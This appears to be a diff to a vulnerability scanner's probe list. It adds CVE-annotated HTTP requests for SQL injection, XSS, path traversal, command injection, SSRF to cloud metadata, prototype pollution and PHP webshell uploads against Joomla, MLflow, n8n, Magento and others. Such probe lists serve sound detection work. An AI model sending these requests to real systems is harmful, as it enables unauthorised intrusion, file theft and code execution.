@@ -4747,3 +4747,59 @@ GET /wp-json/wp/v2/users/1
 GET /blog/wp-json/wp/v2/users
 GET /index.php?author=1
 POST /?_method=GET header="Content-Type: application/x-www-form-urlencoded" body="rest_route=/wp/v2/users"
+
+# --- CVE-2026-102788 (Joomla Gridbox): the store product list inserts the
+#     sort-by URL parameter into ORDER BY after an alias prefix, so a function
+#     call or subquery reaches ClickHouse/MySQL without an allowlist check. ---
+GET /index.php?option=com_gridbox&view=store&sort-by=id,(SELECT%20SLEEP(5))
+GET /index.php?option=com_gridbox&view=store&sort_by=id,(SELECT%20SLEEP(5))
+
+# --- CVE-2026-102790 (iCagenda for Joomla): the url-type event custom field
+#     stores a javascript: URL that runs when the event is rendered. ---
+POST /index.php?option=com_icagenda&task=event.submit header="Content-Type: application/x-www-form-urlencoded" body="title=Test&custom_url=javascript:alert(1)"
+
+# --- CVE-2026-112350 (Sunhillo SureLine): radarUpdater.cgi reads the filename
+#     parameter without authentication or traversal filtering. ---
+GET /radarUpdater.cgi?filename=../../../../etc/passwd
+
+# --- CVE-2026-112351 (Sunhillo SureLine): networkDiag.cgi decodes newline and
+#     ampersand separators in ipAddr/dnsAddr before building ping/nslookup. ---
+GET /networkDiag.cgi?mode=ping&ipAddr=127.0.0.1%0aid
+GET /networkDiag.cgi?mode=nslookup&dnsAddr=example.com%26id
+
+# --- CVE-2026-116818 (OpenPanel): the unauthenticated live-visitors WebSocket
+#     interpolates the projectId path segment into a ClickHouse query. ---
+GET /live/visitors/%27%20OR%201%20=%201%20--%20
+GET /live/visitors/1%27%20UNION%20SELECT%20count()%20FROM%20events%20--%20
+
+# --- CVE-2026-116690 (MLflow): the prompt branch stores a schemeless relative
+#     source as the model-version artifact location, which get-artifact reads. ---
+POST /api/2.0/mlflow/model-versions/create header="Content-Type: application/json" body="{\"name\":\"m\",\"source\":\"../../../../etc/passwd\",\"run_id\":\"r\"}"
+GET /api/2.0/mlflow/model-versions/get-artifact?name=m&version=1&path=../../../../etc/passwd
+
+# --- CVE-2026-58205 (GRR): maj.php reflects forcemaj without escaping when the
+#     installation files remain accessible. ---
+GET /maj.php?forcemaj=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+
+# --- CVE-2026-116826 (YesWiki): page duplication accepts file:// and internal
+#     URLs in the files array and stores the fetched content under files/. ---
+POST /api/pages/PageTag/duplicate header="Content-Type: application/json" body="{\"files\":[\"file:///etc/passwd\"]}"
+POST /api/pages/PageTag/duplicate header="Content-Type: application/json" body="{\"files\":[\"http://169.254.169.254/latest/meta-data/\"]}"
+
+# --- CVE-2026-118678 (n8n): a workflow saved with __proto__ connection keys
+#     pollutes the object used by the history compaction task. ---
+POST /rest/workflows header="Content-Type: application/json" body="{\"name\":\"w\",\"connections\":{\"__proto__\":{\"poll\":true}}}"
+
+# --- CVE-2014-125137 (qEngine/Kemana/Cart Engine): admin/task.php includes the
+#     run parameter after only a weak check, allowing local file inclusion. ---
+GET /admin/task.php?run=../../../../../../windows/win.ini
+
+# --- CVE-2014-125138 (qEngine/Kemana/Cart Engine): the qBanner editor saves
+#     page_image with the caller extension under /public/image. ---
+POST /admin/task.php?mod=qbanner&run=edit.php header="Content-Type: multipart/form-data; boundary=X" bodyhex=2d2d580d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2241585352465f746f6b656e220d0a0d0a746f6b656e0d0a2d2d580d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d22706167655f696d616765223b2066696c656e616d653d227368656c6c2e706870220d0a436f6e74656e742d547970653a206170706c69636174696f6e2f6f637465742d73747265616d0d0a0d0a3c3f706870206563686f20313b203f3e0d0a2d2d582d2d0d0a
+
+# --- CVE-2026-48356 (Magento/Adobe Commerce, KEV "PolyShell"): the anonymous
+#     guest-cart REST item endpoint accepts a file_info object, keeps the
+#     caller's .php extension, and writes it under pub/media/custom_options. ---
+POST /rest/default/V1/guest-carts/abc123/items header="Content-Type: application/json" body="{\"cartItem\":{\"sku\":\"shirt\",\"qty\":1,\"product_option\":{\"extension_attributes\":{\"custom_options\":[{\"option_id\":\"999999\",\"option_value\":\"file\",\"extension_attributes\":{\"file_info\":{\"base64_encoded_data\":\"R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==\",\"type\":\"image/gif\",\"name\":\"payload.php\"}}}]}}}}"
+PUT /rest/V1/guest-carts/abc123/items/42 header="Content-Type: application/json" body="{\"cartItem\":{\"sku\":\"shirt\",\"qty\":1,\"product_option\":{\"extension_attributes\":{\"custom_options\":[{\"option_id\":\"999999\",\"option_value\":\"file\",\"extension_attributes\":{\"file_info\":{\"base64_encoded_data\":\"R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==\",\"type\":\"image/gif\",\"name\":\"payload.phtml\"}}}]}}}}"
